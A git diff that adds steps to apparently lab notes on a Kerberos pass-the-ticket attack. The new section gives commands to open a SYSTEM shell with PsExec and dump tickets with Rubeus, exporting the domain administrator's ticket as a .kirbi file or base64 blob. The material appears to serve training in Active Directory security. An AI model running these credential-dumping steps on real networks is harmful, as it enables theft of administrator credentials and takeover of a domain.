@@ -9,6 +9,26 @@ A couple of ways to obtain tickets are:
 - Stealing them from memory from a compromised host
 - Forging them with a Golder/Silver Ticket attack
 
+#### Extracting the `Domain Admin ticket`
+**Elevate to SYSTEM on that host
+```
+.\PsExec64.exe -accepteula -s -i cmd.exe
+```
+- This will open `cmd.exe` as `SYSTEM`. All following commands should be run in that terminal.
+
+**Dump tickets with Rubeus and export a `.kirbi`
+```
+cd C:\path\to\Rubeus
+.\Rubeus.exe dump /outfile:admin_ticket.kirbi
+```
+
+**If `/outfile` not supported
+```
+.\Rubeus.exe dump > dump.txt
+notepad dump.txt
+```
+- Find the `KRB-CRED` / base64 block for the ticket. Copy the entire base64 blob (no extra text).
+
 #### Performing the attack
 Once the ticket has been obtained, use ***Rubeus*** to perform ***pass-the-ticket*** attack. For this lab, `ticket.kirbi` has been provided.
 - `ticket.kirbi:` is a TGT for the domain administrator.
